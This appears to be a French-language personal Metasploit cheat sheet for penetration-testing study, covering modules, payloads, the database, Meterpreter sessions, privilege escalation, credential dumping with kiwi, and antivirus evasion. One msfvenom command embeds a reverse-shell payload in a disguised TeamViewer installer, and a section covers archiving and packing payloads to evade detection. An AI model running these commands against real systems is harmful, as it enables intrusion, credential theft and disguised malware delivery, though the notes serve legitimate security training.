 

Codé en ruby

- Enumeration
- Preparation
- Exploitation
- Privilege Escalation
- Post-Exploitation

![[Pasted image 20250322212516.png]]


- [[#MODULES]]
- [[#PAYLOADS]]
- [[#ENCODERS]]
- [[#DATABASES]]
- [[#PLUGINS]]
- [[#SESSIONS & JOBS]]
- [[#METERPRETER]]
- [[#PORTAGE DE MODULES]]
- [[#AV BYPASSES]]


# MODULES

Modules situés dans /usr/share/metasploit-framework/modules

Mettre à jour Metasploit pour obtenir les derniers modules

```bash
sudo apt update; sudo apt install --only-upgrade metasploit-framework
```

possible également de télécharger les modules depuis exploit-db ou searchploit et les ajouter dans /usr/share/metasploit-framework/modules

```bash
searchsploit nagios
```

```bash
searchsploit -m <path>
```


> [!tip]
> Penser a reload les modules dans metasploit pour charger les nouveaux modules

```msfconsole
reload_all 
```

## Exploits

Exploits situés dans 

```shell
locate exploits
```

`/usr/share/metasploit-framework/modules/exploits`

Aide à la recherche

```shell
help search
```

recherche d'un exploit eternalblue:

```msfconsole
search eternalblue type:exploit
```

Recherche des CVE sur l'annéee 2021 de type exploit sur la plateforme windows

```msfconsole
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

afficher informations sur un module (après sélection du module):

```msfconsole
info
```

Rendre une option permanente avec SETG (jusqu'au redémarrage de metasploit)

```msfconsole
setg RHOSTS 10.10.10.40
```

executer l'exploit

```msfconsole
run
```
ou
```msfconsole
exploit
```

# TARGETS

afficher les targets possibles avec le module:

```msfconsole
show targets
```

possible de set une target

```msfconsole
set target x
```

## Identifier target type

Pour identifier le target type correctement:

- Obtenir une copy du binaire cible
- Utiliser msfpescan pour localiser une adresse de retour


# PAYLOADS

Single -> stageless (payload envoyé d'un coup)
Stager -> établi la connexion
Stage -> composant du payload appelé par le stager

Afficher les payloads

```msfconsole
show payloads
```

Utiliser grep

```msfconsole
grep meterpreter show payloads
```

```msfconsole
grep meterpreter grep reverse_tcp show payloads
```

set un payload

```msfconsole
set payload 15
```

## Meterpreter Payload

> [!TIP]
> - basé sur une injection de DLL et ne laisse pas de trace sur le disque et donc difficile à détecter.
> - Intègre des plugins qu'il est possible de charger et décharger à la volée (Mimikatz par ex).
> - Utille pour la persistance
> 

### Session Meterpreter

afficher toutes les commandes

```msfconsole
help
```

### Navigation

> [!TIP]
> navigation comme sous linux (cd, cat, /path/to/folder)


Autres types de payloads intéressants sous windows

|**Payload**|**Description**|
|---|---|
|`generic/custom`|Generic listener, multi-use|
|`generic/shell_bind_tcp`|Generic listener, multi-use, normal shell, TCP connection binding|
|`generic/shell_reverse_tcp`|Generic listener, multi-use, normal shell, reverse TCP connection|
|`windows/x64/exec`|Executes an arbitrary command (Windows x64)|
|`windows/x64/loadlibrary`|Loads an arbitrary x64 library path|
|`windows/x64/messagebox`|Spawns a dialog via MessageBox using a customizable title, text & icon|
|`windows/x64/shell_reverse_tcp`|Normal shell, single payload, reverse TCP connection|
|`windows/x64/shell/reverse_tcp`|Normal shell, stager + stage, reverse TCP connection|
|`windows/x64/shell/bind_ipv6_tcp`|Normal shell, stager + stage, IPv6 Bind TCP stager|
|`windows/x64/meterpreter/$`|Meterpreter payload + varieties above|
|`windows/x64/powershell/$`|Interactive PowerShell sessions + varieties above|
|`windows/x64/vncinject/$`|VNC Server (Reflective Injection) + varieties above|

# ENCODERS

Afficher les encoders

```msfconsole
show encoders
```


# DATABASES

> [!TIP]
> Permet de stocker les resultats, utile en cas de large perimètre

Lancer service postgresql

```bash
sudo systemctl start postgresql
```

Lancer la base de données

```shell
sudo msfdb init
```

si erreur mettre à jour Metasploit

```bash
sudo apt update ; sudo apt install --only-upgrade metasploit-framework
```

Check du statut du service

```shell
sudo msfdb status
```

Se connecter à la base de données

```shell
sudo msfdb run
```

Si pas possible de modifier le pass utilisateur, reinitialiser la db

```shell
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

afficher le statut de la db dans msfconsole

```msfconsole
db_status
```

afficher les options de la db

```msfconsole
help database
```


## Utiliser la DB

afficher les workspaces

```shell
workspace
```

Créer un workspace

```shell
workspace -a Target_1
```

Sélectionner un workspace

```shell
workspace Target_1 
```

Supprimer un workspace

```shell
workspace -d Target_1
```

## Importer des resultats de scan

Importer un scan nmap à la db (préférer le format xml pour les imports)

```shell
db_import Target.xml
```

afficher les hôtes scannés

```shell
hosts
```

```shell
hosts -h
```

afficher les services découverts

```shell
services
```

```shell
services -h
```

## Scan NMAP depuis MSFConsole

lancer un scan

```shell
db_nmap -sV -sS 10.10.10.8
```

## Backup de la DB

```shell
db_export -h
```

exporter la db au format XML

```shell
db_export -f xml backup.xml
```

## Credentials

```shell
creds -h
```

ajouter un user, son password et le realm

```shell
creds add user:admin password:notpassword realm:workgroup
```

## Loot

```shell
loot -h
```


# PLUGINS

lister les plugins

```shell
ls /usr/share/metasploit-framework/plugins
```

Charger un plugin

```shell
load <plugin>
```

Afficher l'aide pour le plugin

```shell
<plugin>_help
```


## Plugins populaires:

|   |   |   |
|---|---|---|
|[nMap (pre-installed)](https://nmap.org/)|[NexPose (pre-installed)](https://sectools.org/tool/nexpose/)|[Nessus (pre-installed)](https://www.tenable.com/products/nessus)|
|[Mimikatz (pre-installed V.1)](http://blog.gentilkiwi.com/mimikatz)|[Stdapi (pre-installed)](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi)|[Railgun](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation)|
|[Priv](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb)|[Incognito (pre-installed)](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)|[Darkoperator's](https://github.com/darkoperator/Metasploit-Plugins)|

---

# SESSIONS & JOBS

## Sessions

Lister les sessions

```msfconsole
sessions
```

Intéragir avec une session

```msfconsole
sessions -i <id>
```

## Jobs

afficher l'aide

```msfconsole
jobs -h
```

afficher les jobs

```msfconsole
jobs -l
```


# METERPRETER

https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/

- Fileless -> exécuté directement en mémoire de par injection de processus.
- Communication chiffrée en AES ce qui permet l'évasion d'NIDS/NIPS/NDR.
- Limite les évidences laissées pour le Forensic.

- [[#Général]]
- [[#Privesc]]
- [[#Dump Hashes]]
- [[#BOF]]


## Général

afficher userid

```meterpreter
getuid
```

afficher pid

```meterpreter
getpid
```

lister les processus

```meterpreter
ps
```

mettre la session en background

```meterpreter
bg
```

### Windows

Voler le token d'un processus (nécessite les droits SYSTEM)

```meterpreter
steal_token <pid>
```

Migrer de processus

```
migrate <pid>
```

## Privesc

mettre la session en background

```meterpreter
bg
```

rechercher **local_exploit_suggester**

```msfconsole
search local_exploit_suggester
```

attacher à la session et run

```msfconsole
set session <id>
```

```msfconsole
run
```

use d'un exploit trouvé

```msfconsole
use exploit/windows/local/ms15_051_client_copy_images
```

afficher les options

```msfconsole
options
```

attacher à la session, metrre le exitfunc sur le thread et run

```msfconsole
set session <id>
```

```
setg exitfunc thread
```

```msfconsole
run
```


## Dump Hashes

Dump de la base SAM

```meterpreter
hashdump
```

### Kiwi

> [!TIP]
> Module mimikatz

Charger le module

```meterpreter
load kiwi
```

afficher les commandes

```meterpreter
help
```

Dump de la base SAM

```meterpreter
lsa_dump_sam
```

Dump de la base LSA

```meterpreter
lsa_dump_secrets
```

## BOF

Possible d'utiliser des BOF (Beacon Object Files) contenant des payloads en restant discret, un peu dans le même esprit qu'avec Cobalt Strike.

https://moulinette.org/posts/msf-bof/



# PORTAGE DE MODULES

Possible de créer des modules en ruby, reprendre un module existant pour avoir la forme et coder l'exploit en se basant sur un PoC existant en python par exemple.

> [!IMPORTANT]
> L'indentation doit se faire avec des tabs
> Important de transposer les classes incluses a celles de metasploit

Pour trouver les classes appropriées -> https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf


---
# AV BYPASSES

## OPTION 1 - Créer un payload à partir du Template d'un programme légitime

Stageless Windows x86 avec Template de programme et encodé en Shikata (-k pour permettre le lancement du programme)

```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

### OPTION 2 - Archiver un payload 

Télécharger RARLABS
https://www.rarlab.com/download.htm

```shell
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
```

Archiver le payload plusieurs fois avec mot de passe sur chaque archive et supprimer l'extension de leur nom.

```shell
rar a test.rar -p test.js
mv test.rar test
rar a test2.rar -p test
mv test2.rar test2
```


### OPTION 3 - Packer

Compression d'executable avec le payload packé à l'intérieur.

https://jon.oberheide.org/files/woot09-polypack.pdf

[UPX packer](https://upx.github.io/)

[The Enigma Protector](https://enigmaprotector.com/)
<br>[MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm)


### Randomiser le code dans les exploits

- Eviter d'utiliser les NOP sleds évidents lors de Buffer Overflow
